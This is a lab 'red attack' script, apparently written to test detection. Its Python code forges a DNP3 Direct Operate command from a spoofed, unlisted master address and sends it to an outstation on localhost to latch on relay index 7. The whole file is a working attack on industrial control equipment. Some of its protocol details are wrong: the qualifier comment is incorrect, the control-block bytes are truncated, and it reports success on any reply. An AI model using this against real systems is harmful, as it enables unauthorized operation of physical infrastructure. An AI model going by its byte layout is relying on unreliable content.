#!/bin/bash
# DNP3 Sequence Anomaly Lab - Red Attack Script
# Sends an unauthorized Direct Operate (FC3) frame from an unlisted master address (66) without a preceding Select (FC1).

python3 -c "
import socket
import struct

def crc16(data):
    crc = 0x0000
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if (crc & 1):
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return ~crc & 0xFFFF

def make_dnp3_frame(control, dest_addr, src_addr, payload=b''):
    start = b'\x05\x64'
    length = 5 + len(payload)
    hdr_data = start + bytes([length, control]) + struct.pack('<H', dest_addr) + struct.pack('<H', src_addr)
    hdr_crc = struct.pack('<H', crc16(hdr_data))
    
    payload_with_crcs = b''
    for i in range(0, len(payload), 16):
        block = payload[i:i+16]
        payload_with_crcs += block + struct.pack('<H', crc16(block))
        
    return hdr_data + hdr_crc + payload_with_crcs

def main():
    # Target: Outstation 10, Port 20000, sending from unlisted Master 66
    dest_addr = 10
    src_addr = 66
    
    # Direct Operate (FC3), CROB (Object 12 Var 1), Index 7, Control: Latch On (1)
    # Payload format: [Transport, AppCtrl, FuncCode, ObjType, Var, Qualifier, Count, Index...]
    # Transport Header: \xc0, App Control: \xc2, Function Code: \x03 (Direct Operate)
    # Object: \x0c (Object 12), Var: \x01 (Var 1)
    # Qualifier: \x28 (1-byte count, 2-byte index)
    # Count: \x01, Index: \x07\x00 (7)
    # Control: \x01 (Latch On), Count: \x01, On Time: \x01\x00\x00\x00, Off Time: \x00\x00\x00\x00
    payload = b'\xc0\xc2\x03\x0c\x01\x28\x01\x07\x00\x01\x01\x01\x00\x00\x00\x00'
    frame = make_dnp3_frame(0xc4, dest_addr, src_addr, payload)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect(('127.0.0.1', 20000))
        print('[*] Connecting to DNP3 Outstation...')
        s.send(frame)
        print('[*] Unauthorized Direct Operate (FC3) sent from Master 66 (unlisted) to Index 7.')
        resp = s.recv(1024)
        if resp:
            print('[+] Response received from Outstation!')
            print('[+] Status: SUCCESS')
        else:
            print('[-] No response received.')
    except Exception as e:
        print(f'[-] Connection failed: {e}')
    finally:
        s.close()

if __name__ == '__main__':
    main()
"